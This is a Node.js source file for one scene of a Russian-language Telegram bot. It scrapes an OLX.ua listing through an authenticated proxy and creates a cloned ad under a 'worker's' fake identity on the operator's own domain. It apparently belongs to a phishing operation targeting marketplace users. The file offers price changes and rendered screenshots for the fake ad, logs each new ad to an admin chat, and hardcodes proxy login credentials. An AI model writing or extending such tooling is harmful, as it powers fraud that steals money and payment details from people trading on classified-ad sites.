const { Scenes } = require("telegraf");
const { sequelize, Sequelize } = require("../../db");
const { User, Ad, Settings } = require("../../db");
const cheerio = require("cheerio");
const axios = require('axios');
const Wizard = Scenes.WizardScene;
const CloudflareBypasser = require('cloudflare-bypasser');
let cf = new CloudflareBypasser();
const HttpsProxyAgent = require("https-proxy-agent");

const httpsAgent = new HttpsProxyAgent({
  host: "185.77.137.220",
  port: "63074",
  auth: "JGAW5Re6:PwwRf9tu"
});

async function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

const scene = new Wizard(
  "olxua",
  async (ctx) => {
    try {
      const user = await User.findOne({
        where: {
          userid: ctx.from.id,
        },
      });

      if (user.ban == 0) {
        if (user.fio) {
          const keyboard = JSON.stringify({
            inline_keyboard: [
              [
                {
                  text: "✖ Отменить",
                  callback_data: `cancel`,
                },
              ],
            ],
          });

          await ctx.replyWithHTML('<b>🔗 Отправьте ссылку на объявление</b>', { reply_markup: keyboard });
          return ctx.wizard.next();

        } else {
          await ctx.replyWithHTML('<b>❌ У вас не установлены данные фейка! ❌\n\n<code>⚙️ Настройки  ➔ 👱‍♂️ Данные фейков</code></b>');
          return ctx.scene.leave();
        }
      }
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    const settings = await Settings.findOne({
      where: {
        id: 1,
      },
    });
    try {

      const adid = parseInt(Math.floor(Math.random() * (99999999 - 999999 + 1) + 999999) + new Date().getTime() / 10000);
      if (!ctx.message?.text) return ctx.scene.leave();
      if (ctx.message.text.includes('olx.ua')) {
        await ctx.replyWithHTML('<b>♻️ Парсим ♻️</b>');
        let url = new URL(ctx.message.text);
        url.host = url.host
          .replace("m.olx.ua", "olx.ua")
          .replace("olx.ua/oferta", "olx.ua/d/oferta");
        url.hostname = url.host;

        // Отправка запроса с кастомным User-Agent и через прокси-сервер
        const ad = await axios.get(encodeURI(url.href), {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
          },
          httpsAgent
        });

        const $ = cheerio.load(ad.data);

        const info = {
          title: $("title").text().split(': ')[0],
          price: $('[name="description"]').attr('content').split(':')[0],
          adLink: url.href,
        };

        try {
          info.photo = $(".swiper-zoom-container img").first().attr("src");
        } catch (err) {}

        console.log(info);

        if (!info.title || !info.price) {
          await ctx.reply("❌ Не удалось спарсить объявление").catch((err) => err);
          return ctx.scene.leave();
        }

        const user = await User.findOne({
          where: {
            userid: ctx.from.id,
          },
        });

        await Ad.create({
          adid: adid,
          title: info.title,
          price: info.price,
          img: info.photo,
          worker: ctx.from.id,
          fio: user.fio,
          number: user.number,
          address: user.address,
          service: 'olxua',
        });

        let domain = settings.domain;

        if (user.pro && user.usepro) {
          domain = settings.domainpro;
        }

        await ctx.replyWithHTML(`<b>❕Создано объявление OLX.UA
◾️Название товара:<code>${info.title}</code>
◾️Стоимость объявления: <code>${info.price}</code>
◾️ID товара: <code>${adid}</code>
➕ Ссылка на объявление: <code>https://${domain}/${adid}</code></b>`, {
          parse_mode: "HTML",
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                {
                  text: "💵 Изменить стоимость",
                  callback_data: `changecost_${adid}`,
                },
              ],
              [
                {
                  text: "📝 Получить отрисовку",
                  callback_data: `getdraw_${adid}`,
                },
              ]
            ],
          }),
        });

        await ctx.telegram.sendMessage(
          '-4243153976',
          `<b>@${ctx.from.username} создал объявление №${adid} (СЕРВИС OLX.UA) (${ctx.message.text})</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
          }
        );
        return ctx.scene.leave();
      } else {
        return ctx.scene.leave();
      }
    } catch (err) {
      console.log(err);
      ctx.reply("❌ Произошла непредвиденная ошибка, сообщите администрации").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

scene.leave();

module.exports = scene;
